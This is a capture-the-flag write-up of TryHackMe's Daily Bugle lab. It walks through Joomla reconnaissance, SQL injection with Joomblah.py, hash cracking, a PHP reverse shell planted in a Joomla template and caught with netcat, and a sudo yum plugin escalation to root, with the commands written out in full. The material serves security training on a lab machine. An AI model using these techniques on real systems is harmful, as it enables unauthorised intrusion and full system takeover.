# DailyBugle
*My notes and solutions for TryHackMe.com's DailyBugle room.*

>
> Bradley Lubow | rnbochsr  August 2022
>

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

I've never done anything with yum, so this will probably take a lot of reading to find the escalation vector. Deploy the machine and answer the questions.

## Recon

Initial recon starts with the following scans: 
* `nmap` 
* `dirb` 
* `gobuster` 
* `nikto`


### NMAP Scan

Open ports: 
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-06 18:40 UTC
Nmap scan report for ip-10-10-228-9.eu-west-1.compute.internal (10.10.228.9)
Host is up (0.0017s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:B1:D4:02:F8:19 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds
```

Running service identification on the discovered ports shows:
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-06 18:51 UTC
Nmap scan report for ip-10-10-228-9.eu-west-1.compute.internal (10.10.228.9)
Host is up (0.00028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:B1:D4:02:F8:19 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.02 seconds
```

This shows us that: 
* `ssh` is available.
* A web server is running on Apache 2.4.6.
* CentOS operating system.
* Joomla CMS is running.
* A `robots.txt` file listing files and locations off limits to web crawlers. These are some good targets to explore. 
* A `mysql` server is running. It is using `MariaDB`. I'm not familiar with MariaDB, but the commands are in a public info document somewhere. I'll find them. This also means that we can run a SQLMap scan to see if any vectors can be found in the `mysql` server.

A quick visit to the Daily Bugle website gives the answer to task 1. Who robbed the bank? Sp[REDACTED]an 

It also shows a login form we can try to abuse. I've captured the home page source for future reference. 

Continuing with our initial recon. 

### Dirb Scan
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.scan
START_TIME: Sat Aug 13 19:49:53 2022
URL_BASE: http://10.10.162.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.162.15/ ----

(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)

-----------------
END_TIME: Sat Aug 13 19:50:03 2022
DOWNLOADED: 0 - FOUND: 0

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.scan
START_TIME: Sat Aug 13 19:51:31 2022
URL_BASE: http://10.10.162.152/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.162.152/ ----
==> DIRECTORY: http://10.10.162.152/administrator/
==> DIRECTORY: http://10.10.162.152/bin/
==> DIRECTORY: http://10.10.162.152/cache/
+ http://10.10.162.152/cgi-bin/ (CODE:403|SIZE:210)
==> DIRECTORY: http://10.10.162.152/components/
==> DIRECTORY: http://10.10.162.152/images/
==> DIRECTORY: http://10.10.162.152/includes/
+ http://10.10.162.152/index.php (CODE:200|SIZE:9280)
==> DIRECTORY: http://10.10.162.152/language/
==> DIRECTORY: http://10.10.162.152/layouts/
==> DIRECTORY: http://10.10.162.152/libraries/
==> DIRECTORY: http://10.10.162.152/media/
==> DIRECTORY: http://10.10.162.152/modules/
==> DIRECTORY: http://10.10.162.152/plugins/
+ http://10.10.162.152/robots.txt (CODE:200|SIZE:836)
==> DIRECTORY: http://10.10.162.152/templates/
==> DIRECTORY: http://10.10.162.152/tmp/

---- Entering directory: http://10.10.162.152/administrator/ ----
==> DIRECTORY: http://10.10.162.152/administrator/cache/
==> DIRECTORY: http://10.10.162.152/administrator/components/
==> DIRECTORY: http://10.10.162.152/administrator/help/
==> DIRECTORY: http://10.10.162.152/administrator/includes/
+ http://10.10.162.152/administrator/index.php (CODE:200|SIZE:4846)
==> DIRECTORY: http://10.10.162.152/administrator/language/
==> DIRECTORY: http://10.10.162.152/administrator/logs/
==> DIRECTORY: http://10.10.162.152/administrator/modules/
==> DIRECTORY: http://10.10.162.152/administrator/templates/

---- Entering directory: http://10.10.162.152/bin/ ----
+ http://10.10.162.152/bin/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/cache/ ----
+ http://10.10.162.152/cache/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/components/ ----
+ http://10.10.162.152/components/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/images/ ----
==> DIRECTORY: http://10.10.162.152/images/banners/
==> DIRECTORY: http://10.10.162.152/images/headers/
+ http://10.10.162.152/images/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/includes/ ----
+ http://10.10.162.152/includes/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/language/ ----
+ http://10.10.162.152/language/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/layouts/ ----
+ http://10.10.162.152/layouts/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.10.162.152/layouts/joomla/
==> DIRECTORY: http://10.10.162.152/layouts/libraries/
==> DIRECTORY: http://10.10.162.152/layouts/plugins/

---- Entering directory: http://10.10.162.152/libraries/ ----
==> DIRECTORY: http://10.10.162.152/libraries/cms/
+ http://10.10.162.152/libraries/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.10.162.152/libraries/joomla/
==> DIRECTORY: http://10.10.162.152/libraries/legacy/
==> DIRECTORY: http://10.10.162.152/libraries/vendor/

---- Entering directory: http://10.10.162.152/media/ ----
==> DIRECTORY: http://10.10.162.152/media/cms/
==> DIRECTORY: http://10.10.162.152/media/contacts/
==> DIRECTORY: http://10.10.162.152/media/editors/
+ http://10.10.162.152/media/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.10.162.152/media/mailto/
==> DIRECTORY: http://10.10.162.152/media/media/
==> DIRECTORY: http://10.10.162.152/media/system/

---- Entering directory: http://10.10.162.152/modules/ ----
+ http://10.10.162.152/modules/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/plugins/ ----
==> DIRECTORY: http://10.10.162.152/plugins/authentication/
==> DIRECTORY: http://10.10.162.152/plugins/captcha/
==> DIRECTORY: http://10.10.162.152/plugins/content/
==> DIRECTORY: http://10.10.162.152/plugins/editors/
==> DIRECTORY: http://10.10.162.152/plugins/extension/
==> DIRECTORY: http://10.10.162.152/plugins/fields/
+ http://10.10.162.152/plugins/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.10.162.152/plugins/installer/
==> DIRECTORY: http://10.10.162.152/plugins/search/
==> DIRECTORY: http://10.10.162.152/plugins/system/
==> DIRECTORY: http://10.10.162.152/plugins/user/

---- Entering directory: http://10.10.162.152/templates/ ----
+ http://10.10.162.152/templates/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.10.162.152/templates/system/

---- Entering directory: http://10.10.162.152/tmp/ ----
+ http://10.10.162.152/tmp/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/administrator/cache/ ----
+ http://10.10.162.152/administrator/cache/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/administrator/components/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/administrator/help/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/administrator/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/administrator/language/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/administrator/logs/ ----
+ http://10.10.162.152/administrator/logs/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.10.162.152/administrator/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/administrator/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/images/banners/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/images/headers/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/layouts/joomla/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/layouts/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/layouts/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/libraries/cms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/libraries/joomla/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/libraries/legacy/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/libraries/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/cms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/contacts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/editors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/mailto/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/media/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/media/system/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/authentication/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/captcha/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/editors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/extension/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/fields/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/installer/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/search/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/system/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/plugins/user/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/templates/system/ ----
==> DIRECTORY: http://10.10.162.152/templates/system/css/
==> DIRECTORY: http://10.10.162.152/templates/system/html/
==> DIRECTORY: http://10.10.162.152/templates/system/images/
+ http://10.10.162.152/templates/system/index.php (CODE:200|SIZE:0)

---- Entering directory: http://10.10.162.152/templates/system/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/templates/system/html/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.162.152/templates/system/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat Aug 13 19:52:42 2022
DOWNLOADED: 83016 - FOUND: 20
```

### Gobuster Scan
```bash
/media                (Status: 301) [Size: 235] [--> http://10.10.162.152/media/]
/templates            (Status: 301) [Size: 239] [--> http://10.10.162.152/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.162.152/modules/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.162.152/bin/]
/plugins              (Status: 301) [Size: 237] [--> http://10.10.162.152/plugins/]
/includes             (Status: 301) [Size: 238] [--> http://10.10.162.152/includes/]
/language             (Status: 301) [Size: 238] [--> http://10.10.162.152/language/]
/components           (Status: 301) [Size: 240] [--> http://10.10.162.152/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.162.152/cache/]
/libraries            (Status: 301) [Size: 239] [--> http://10.10.162.152/libraries/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.162.152/tmp/]
/images               (Status: 301) [Size: 236] [--> http://10.10.162.152/images/]
/administrator        (Status: 301) [Size: 243] [--> http://10.10.162.152/administrator/]
/layouts              (Status: 301) [Size: 237] [--> http://10.10.162.152/layouts/]
/cli                  (Status: 301) [Size: 233] [--> http://10.10.162.152/cli/]
```

### Nikto Scan
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.162.152
+ Target Port: 80
+ GET Retrieved x-powered-by header: PHP/5.6.40
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET "robots.txt" contains 14 entries which should be manually viewed.
+ HEAD PHP/5.6.40 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ HEAD Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ FDQKPJCL Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-8193: GET /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: GET /administrator/: This might be interesting...
+ OSVDB-3092: GET /bin/: This might be interesting...
+ OSVDB-3092: GET /includes/: This might be interesting...
+ OSVDB-3092: GET /tmp/: This might be interesting...
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3092: GET /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ GET /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ GET /administrator/index.php: Admin login page/section found.
```

### Robots.txt
```bash
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

### Additional Recon
We've found the `robots.txt` file and an `administrator` directory file which both look promising. The `robots.txt` file talks about Joomla, which gives us an idea of the framework the website uses. 

Let's run another scan on that directory. 

#### Gobuster scan of `administrator` directory
```bash
/templates            (Status: 301) [Size: 253] [--> http://10.10.162.152/administrator/templates/]
/modules              (Status: 301) [Size: 251] [--> http://10.10.162.152/administrator/modules/]
/includes             (Status: 301) [Size: 252] [--> http://10.10.162.152/administrator/includes/]
/language             (Status: 301) [Size: 252] [--> http://10.10.162.152/administrator/language/]
/components           (Status: 301) [Size: 254] [--> http://10.10.162.152/administrator/components/]
/cache                (Status: 301) [Size: 249] [--> http://10.10.162.152/administrator/cache/]
/help                 (Status: 301) [Size: 248] [--> http://10.10.162.152/administrator/help/]
/logs                 (Status: 301) [Size: 248] [--> http://10.10.162.152/administrator/logs/]
```

Visiting the `administrator/index.php` login page confirms that the website runs on a Joomla framework. The page doesn't show a version number, and looking at the page source doesn't help much. 


## Task 1
*Access the web server, who robbed the bank?* Sp[REDACTED]an 

## Task 2

### Research
I ran a search for `joomla version scanner` and got some good results. There was one module for Metasploit, an OWASP Joomla scanner, a Kali Joomscan package, and several other options. Opening `msfconsole` and searching for `joomla_version` listed the package. I set the target IP and ran the scanner. The Joomla version was easily obtained. It's such a short answer, I redacted it fully. 

*What is the Joomla version?* [REDACTED]

The task asks to use a Python tool rather than SQLMap. I ran a search for one. It took a few variations, but a search for `joomla [VERSION REDACTED] exploit` got me to a GitHub repository for Joomblah.py. It looks like it should be able to scrape the user data from the database. Running the script gets us Jonah's information, including a hash of his password. 
```bash
──(bradley㉿kali)-[~]
└─$ python3 joomblah.py http://10.10.38.147/                                                              1 ⨯
                                                                                                                                                                                                                            
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/\'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$[REDACTED]BtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Running that thru `hashcat` produces the plaintext password. 

*What is Jonah's cracked password?* sp[REDACTED]23

Now we have login credentials, let's login, take a peek at the user interface, and look for some flags. 

### Login Attempts 

**Homepage**
We are able to use Jonah's credentials on the login form on the home page. That doesn't seem to lead anywhere. We can edit the article, but I don't see much else from my initial review. 

**SSH**
Trying to use Jonah's credentials to login via ssh didn't work. 

**Joomla Administrator Page**
We are able to log into the Joomla CMS using Jonah's credentials. Let's look around for the user flag. 

### Reverse Shell Capture
I can now create a complete page rather than edit one. Let's see about getting one to call my attacking machine using Pentest Monkey's reverse shell script. Trying to create a new article didn't work. The article wouldn't render the `php` code. It just printed as text on the website. 

What I need to do is create an actual page and not an article. As I'm not too familiar with Joomla I looked up some of the documentation and found that I needed to start with a template and create the page that way. From the menu bar select `Extensions > Templates > Templates`. That displays a list of 2 choices: Beez3 or Protostar. I picked the one on top, Beez3, and clicked on the link. Rather than edit an existing file, I selected `New File`. Copying the raw `php-reverse-shell.php` file and pasting it into the new page. I updated the IP and port as needed and saved the new webpage as `shell.php`. 

Back in my attack machine terminal, I started a `netcat` listener on the same port as in the script. 
I pointed my web browser to `http://<machine IP>/shell.php`. I got a 404 not found error. 
A little trial and error and I figured out that my new page was created in the `templates` directory. Pointing my browser to `http://<machine IP>/templates/shell.php` executed the reverse shell code and I caught a shell in my attacking machine terminal. 
```bash
root@kali:~# nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.15.86] from (UNKNOWN) [10.10.135.152] 58242
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:53:07 up  2:40,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$
```

Now let's see about getting the user flag. Looking around I couldn't access Jonah's home directory. Moving into the web directory, `/var/www/html` I looked at the configuration file `configuration.php`. It had some credentials listed as root's and password listed as `$secret`. 

I tried to use both of those to `ssh` into the server, but neither worked. I tried using the `jonah` user with both passwords, but neither worked. I need to do more looking around. I checked the `/etc/passwd` file looking for more information on the system and possible users. 

```bash
sh-4.2$ cat /etc/hosts
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
```

That gives me the username for Jonah as `jjameson`, not `jonah`. Trying that username with both of the passwords from the `configuration.php` file. That got me an ssh session as `jjameson`.

Now I can access the user flag. 
*What is the user flag?* 27[REDACTED]2e


### Privilege Escalation 
Now I need to escalate my privileges to get the root flag. So let's see what `sudo` rights I have, if any, at this user level. 
```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

I've got `sudo` access to `yum` with no password required. Let's see if there is anything else in the directory listing for it. 
```bash
[jjameson@dailybugle ~]$ ls -l /usr/bin/yum
-rwxr-xr-x. 1 root root 801 Aug  8  2019 /usr/bin/yum
```

Everyone can run it, but no sticky bit to exploit. I looked for a privlege escalation exploit for `yum` and found something in the `GTFOBins` Git repository that showed spawning a root shell. It is a series of commands that creates a custom plugin that spawns the shell. I will give that a try. 

```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# pwd
/home/jjameson
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
ee[REDACTED]79
sh-4.2# 
```
It worked like a charm. Now the root flag is accessible. 

*What is the root flag?* ee[REDACTED]79

## Task 3 
Giving credit where credit is due, the author notes the owner of the artwork used in the room. 


## Summary
It was a fun challenge. It had several layers of things to overcome, and I enjoyed it. 
